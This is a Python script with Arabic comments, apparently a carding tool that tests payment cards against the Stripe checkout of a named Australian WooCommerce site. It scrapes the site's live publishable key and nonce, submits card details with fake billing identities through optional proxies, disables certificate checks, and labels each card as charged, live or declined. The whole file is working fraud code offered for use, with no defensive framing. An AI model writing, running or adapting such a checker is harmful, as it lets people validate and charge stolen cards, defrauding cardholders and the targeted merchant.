"""
بوابة الدفع: Stripe Charge 2 (WooCommerce)
الموقع: claddagh.org.au
نوع البوابة: Stripe Charge (WooCommerce)
تدفق الطلبات:
1. GET /checkout/ -> استخراج Stripe publishable key و nonce
2. POST https://api.stripe.com/v1/payment_methods -> الحصول على pm_id
3. POST /checkout/ -> إرسال طلب الدفع النهائي وتصنيف النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import re


async def req1_get_checkout_data(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الخطوة 1: جلب pk_live و nonce من صفحة الدفع."""
    try:
        async with session.get(
            "https://claddagh.org.au/checkout/",
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        pk_match = re.search(r'["\']publishableKey["\']:\s*["\'](pk_live_[^"\']+)["\']', text)
        nonce_match = re.search(r'name="_wpnonce" value="(.*?)"', text)

        pk = pk_match.group(1) if pk_match else "pk_live_51PVC6sFzbukajckZRX9IVkSEB1bcI2g831r7HgD4VK0ZAk2U0572Ya56wQXlyqGdVM62Fj7SXlR7oCSwyJEmq3ZG002t8GWayN"
        nonce = nonce_match.group(1) if nonce_match else ""
        return pk, nonce
    except Exception as e:
        raise RuntimeError(f"req1_get_checkout_data failed: {e}") from e


async def req2_create_payment_method(
    session: aiohttp.ClientSession,
    pk: str,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: إنشاء Payment Method عبر Stripe API."""
    headers = {
        "Authorization": f"Bearer {pk}",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
    }
    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)
            pm_id = res.get("id")
            if not pm_id:
                error_msg = res.get("error", {}).get("message", "Unknown Error in PM creation")
                raise RuntimeError(error_msg)
            return pm_id
    except RuntimeError:
        raise
    except Exception as e:
        raise RuntimeError(f"req2_create_payment_method failed: {e}") from e


async def req3_submit_checkout(
    session: aiohttp.ClientSession,
    pm_id: str,
    nonce: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 3: إرسال طلب الدفع النهائي للموقع."""
    headers = {
        "authority": "claddagh.org.au",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://claddagh.org.au",
        "referer": "https://claddagh.org.au/checkout/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "billing_first_name": "John",
        "billing_last_name": "Doe",
        "billing_company": "",
        "billing_country": "AU",
        "billing_address_1": "1 Dewar St",
        "billing_address_2": "",
        "billing_city": "Morley",
        "billing_state": "WA",
        "billing_postcode": "6062",
        "billing_phone": "0403972265",
        "billing_email": f"johndoe{uuid.uuid4().hex[:6]}@gmail.com",
        "order_comments": "",
        "payment_method": "stripe",
        "stripe_payment_method": pm_id,
        "_wpnonce": nonce,
        "_wp_http_referer": "/checkout/",
    }
    try:
        async with session.post(
            "https://claddagh.org.au/checkout/",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req3_submit_checkout failed: {e}") from e


async def process_ST_2_charge(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Stripe Charge 2 (WooCommerce)."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            pk, nonce = await req1_get_checkout_data(session, proxy_url)
            pm_id = await req2_create_payment_method(session, pk, cc, mes, ano, cvv, proxy_url)
            response_text = await req3_submit_checkout(session, pm_id, nonce, proxy_url)

    except RuntimeError as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    rt_lower = response_text.lower()
    if any(x in response_text for x in ["thank-you", "Thank you", '\"result\":\"success\"']):
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Charged Successfully"
    elif "insufficient_funds" in rt_lower or "card has insufficient funds" in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Insufficient Funds"
    elif "incorrect_cvc" in rt_lower or "security code is incorrect" in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "CCN Live (Incorrect CVC)"
    elif "card_error_authentication_required" in rt_lower or "3d_secure_2" in rt_lower:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "3D Secure Required"
    else:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined / Error"
